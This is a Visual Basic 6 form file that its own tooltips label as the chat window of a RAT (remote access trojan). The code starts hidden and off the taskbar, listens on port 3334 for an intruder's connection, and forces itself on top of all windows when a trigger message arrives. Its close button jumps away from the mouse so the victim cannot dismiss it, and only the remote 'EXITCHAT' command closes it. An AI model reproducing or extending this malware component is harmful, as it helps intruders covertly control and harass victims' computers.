VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Frm_Chat 
   BackColor       =   &H00404040&
   BorderStyle     =   0  'None
   ClientHeight    =   5460
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   6255
   LinkTopic       =   "Form1"
   Moveable        =   0   'False
   ScaleHeight     =   5460
   ScaleWidth      =   6255
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin MSWinsockLib.Winsock sockchat 
      Left            =   840
      Top             =   3480
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   3334
   End
   Begin VB.TextBox txtrecivedmsg 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0C0C0&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   4095
      Left            =   240
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   2
      TabStop         =   0   'False
      Top             =   445
      Width           =   5775
   End
   Begin VB.TextBox txtsendmsg 
      Appearance      =   0  'Flat
      Height          =   375
      Left            =   240
      TabIndex        =   0
      ToolTipText     =   "Message To Send"
      Top             =   4765
      Width           =   4575
   End
   Begin VB.Label lblchatclose 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "X"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Index           =   1
      Left            =   40
      MouseIcon       =   "Frm_Chat.frx":0000
      MousePointer    =   99  'Custom
      TabIndex        =   5
      ToolTipText     =   "Exit RAT chat"
      Top             =   40
      Width           =   255
   End
   Begin VB.Label lblchatclose 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "X"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Index           =   0
      Left            =   5940
      MouseIcon       =   "Frm_Chat.frx":030A
      MousePointer    =   99  'Custom
      TabIndex        =   4
      ToolTipText     =   "Exit RAT chat"
      Top             =   40
      Width           =   255
   End
   Begin VB.Label lblsend 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      Caption         =   "SEND"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000005&
      Height          =   275
      Left            =   4920
      MouseIcon       =   "Frm_Chat.frx":0614
      MousePointer    =   99  'Custom
      TabIndex        =   1
      ToolTipText     =   "Send"
      Top             =   4815
      Width           =   1095
   End
   Begin VB.Label lblchat 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "       Chat"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   11.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000005&
      Height          =   250
      Left            =   0
      TabIndex        =   3
      ToolTipText     =   "CHAT"
      Top             =   45
      Width           =   6250
   End
End
Attribute VB_Name = "Frm_Chat"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim a, b, c As Integer
Dim nick, printmsg, msg As String

Private Sub Form_Unload(Cancel As Integer) 'close the port opened for chat
On Error Resume Next
sockchat.Close
End Sub

Private Sub Form_Load() 'make the form invisible
On Error Resume Next

Call SetWindowPos(Frm_Chat.hWnd, -1, 0, 0, 0, 0, &H2 Or &H1) 'front of all windows

Me.Visible = False
lblchatclose(1).Visible = False
sockchat.Listen
End Sub

'fake the close button -not to reach by mouse
Private Sub lblchatclose_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
If lblchatclose(0).Visible = True Then
lblchatclose(0).Visible = False
lblchatclose(1).Visible = True
Else
lblchatclose(0).Visible = True
lblchatclose(1).Visible = False
End If
End Sub

Private Sub lblsend_Click() 'send msg
On Error Resume Next
If Len(txtsendmsg.Text) <> 0 Then
    sockchat.SendData Trim(txtsendmsg.Text) 'send data
    msg = sockchat.LocalHostName & " :  " & Trim(txtsendmsg.Text)
    txtrecivedmsg.Text = txtrecivedmsg.Text & msg & vbNewLine
    txtrecivedmsg.SelStart = Len(txtrecivedmsg.Text)
    txtsendmsg.SelStart = 0
    txtsendmsg.SelLength = Len(txtsendmsg.Text)
End If
End Sub

Private Sub sockchat_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
If sockchat.State <> sckClosed Then sockchat.Close 'close sock if not closed
sockchat.Accept requestID
End Sub

Private Sub sockchat_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim rvdata As String
Dim datalen As Integer
Dim data As String

sockchat.GetData rvdata
If rvdata = "EXITCHAT" Then
    txtrecivedmsg.Text = ""
    txtsendmsg.Text = ""
    Unload Me 'close the chat
Else
    datalen = Len(rvdata)
    If datalen > 4 Then
        data = Mid(rvdata, datalen - 3, 4)
    End If
    If data = "2222" Then 'if suffix is 2222
        Me.Visible = True 'make the chat form visible when connection established
        nick = Mid(rvdata, 1, datalen - 4)
        txtrecivedmsg.Text = "CHAT_STARTED_WITH_" & nick & "_on_(" & Date & " , " & Time & ")_AS_" & sockchat.LocalHostName & vbNewLine & vbNewLine
    Else
        printmsg = nick & " :  " & rvdata
        txtrecivedmsg.Text = txtrecivedmsg.Text & printmsg & vbNewLine
        txtrecivedmsg.SelStart = Len(txtrecivedmsg.Text)
    End If
End If
End Sub

Private Sub txtsendmsg_Click()
On Error Resume Next
txtsendmsg.SelStart = 0
txtsendmsg.SelLength = Len(txtsendmsg.Text)
End Sub

Private Sub txtsendmsg_GotFocus()
txtsendmsg.SelStart = 0
txtsendmsg.SelLength = Len(txtsendmsg.Text)
End Sub

Private Sub txtsendmsg_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then lblsend_Click
End Sub

Private Sub lblsend_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsend.BorderStyle = 1
End Sub

Private Sub lblsend_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsend.BorderStyle = 0
End Sub

